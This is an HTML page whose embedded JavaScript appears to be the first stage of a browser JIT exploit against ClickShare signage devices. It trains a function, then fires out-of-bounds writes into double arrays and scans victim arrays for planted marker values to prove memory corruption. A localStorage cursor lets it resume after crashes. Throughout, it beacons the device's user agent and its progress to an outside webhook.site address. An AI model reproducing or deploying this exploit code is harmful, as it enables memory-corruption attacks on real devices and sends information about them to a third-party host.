<html><body><script>
// ClickShare signage -- stage 1 S3.
// Proven inputs: q2 = PACKED_DOUBLE oob_array elides FAST (crash <200ms with wild warm);
// dev7965_live = warm(0x500 + poc(35) + 50k) then fire crashes => elision live at 51k;
// s2 = warm with NARROW dirt (4) never elides (range-fold) => warm must feed WIDE values.
// Design: warm with random wide dirt, storing WARMVAL (distinct double) -- if elision is live,
// WARMVAL appears in the victim ring (HIT-warm = primitive proof, before any fire).
// Fires store MARKER at chosen small dirts (victim data zone). Cursor in localStorage:
// a crash mid-schedule reloads and resumes at the next dirt (drive5830 pattern).
const SINK = 'https://webhook.site/1ccce666-4eae-419c-86a9-a4c4e16e3460';
const MARKER = 1.2345678901234e-300;   // fire value (controlled)
const WARMVAL = 9.8765432109876e-300;   // warm value (random-offset proof)
function beacon(t, v){
  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
}
var LS = null;
try { LS = window.localStorage; LS.getItem('x'); } catch(e) { LS = null; }
beacon('S3-start', navigator.userAgent.slice(0,80) + ' ls=' + (!!LS));
try {
  const RING = 4000;
  var ring = [];
  for (let k = 0; k < RING; k++) { var a = new Array(64); for (let z = 0; z < 64; z++) a[z] = 1.0 + z; ring.push(a); }
  var arrx = new Array(150); for (let z = 0; z < 150; z++) arrx[z] = 0.5 + z;
  beacon('S3-pool-done', RING);

  var fake = new Uint32Array(10);
  fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
  var tahir = 0x1;
  var whits = 0, hits = 0;
  function poc(a, dirt, val) {
    var oob_array = [0.5, 1.5, 2.5, 3.5, 4.5];      // PACKED_DOUBLE literal (q2-proven write path)
    var victim = new Array(64); for (let z = 0; z < 64; z++) victim[z] = 1.0 + z;
    if (ring.length < 20000) ring.push(victim);
    let just_a_variable = fake[0];
    let another_variable3 = fake[7];
    if (a % 7 == 0) another_variable3 = dirt;
    another_variable3 = Math.max(another_variable3, tahir);
    another_variable3 = another_variable3 >>> 0;
    var index = fake[3];
    var for_phi_modes = fake[6];
    let c = fake[1];
    for (var i = 0; i < 10; i++) {
      if (a % 3 == 0) just_a_variable = c;
      if (a % 37 == 0) just_a_variable = fake[2];
      if (a % 11 == 0) just_a_variable = fake[8];
      if (a % 17 == 0) just_a_variable = fake[5];
      if (a % 19 == 0) just_a_variable = fake[4];
      if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }
      if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = val; } } }
      for_phi_modes = c; c = just_a_variable;
    }
    return index;
  }
  function warm(n){
    for (let i = 0; i < n; i++) {
      var d = (0x800 + (Math.random() * 0x7800)) >>> 0;   // wide, random: keeps phi range wide; +16KB..+240KB lands in ring data
      poc(i % 500 + 2, d, WARMVAL);
    }
  }
  function sweep(tag){
    for (let k = 0; k < ring.length; k++) {
      var v = ring[k];
      if (v.length !== 64) { if (hits++ < 4) beacon('HIT-len','at='+tag+' k='+k+' len='+v.length); continue; }
      for (let j = 0; j < 64; j++) {
        if (v[j] === WARMVAL) { if (whits++ < 3) beacon('HIT-warm','at='+tag+' k='+k+' j='+j); }
        else if (v[j] === MARKER) { if (hits++ < 4) beacon('HIT-mark','at='+tag+' k='+k+' j='+j); }
      }
    }
    try { for (let j = 0; j < 150; j++) { if (arrx[j] === MARKER) { if (hits++ < 4) beacon('HIT-arrx','at='+tag+' j='+j); } } } catch(e){}
    beacon('S3-iter','at='+tag+' whits='+whits+' hits='+hits);
  }
  // canonical warm schedule (dev7965_live): 0x500 loop + poc(35) + 50k loop
  warm(0x500 - 2 + 1); poc(35, 0x1000, WARMVAL); warm(50000);
  beacon('S3-warm-done','ok');
  sweep('warm');                    // HIT-warm here = elision LIVE (primitive proof)
  var dirts = [16, 20, 24, 28, 32, 40, 48, 64];
  var cur = 0;
  if (LS) { cur = +(LS.getItem('s3cur') || 0); if (cur >= dirts.length) { beacon('S3-complete','whits='+whits+' hits='+hits); throw 'done'; } }
  var d = cur;
  function fire(){
    if (d >= dirts.length) { beacon('S3-SURVIVED','whits='+whits+' hits='+hits); if (LS) LS.setItem('s3cur','999'); return; }
    var dirt = dirts[d];
    beacon('S3-fire','dirt=0x'+dirt.toString(16)+' #'+d);
    d++;
    if (LS) { try { LS.setItem('s3cur', String(d)); } catch(e){} }   // commit BEFORE the risky write
    setTimeout(function(){
      try { poc(35, dirt, MARKER); } catch (e) { beacon('S3-fire-exc','dirt='+dirt+':'+String(e).slice(0,80)); }
      setTimeout(function(){ sweep('d'+dirt); setTimeout(fire, 110); }, 90);
    }, 90);
  }
  setTimeout(fire, 110);
} catch (e) { if (String(e) !== 'done') beacon('S3-exc', String(e).slice(0,120)); }
</script></body></html>
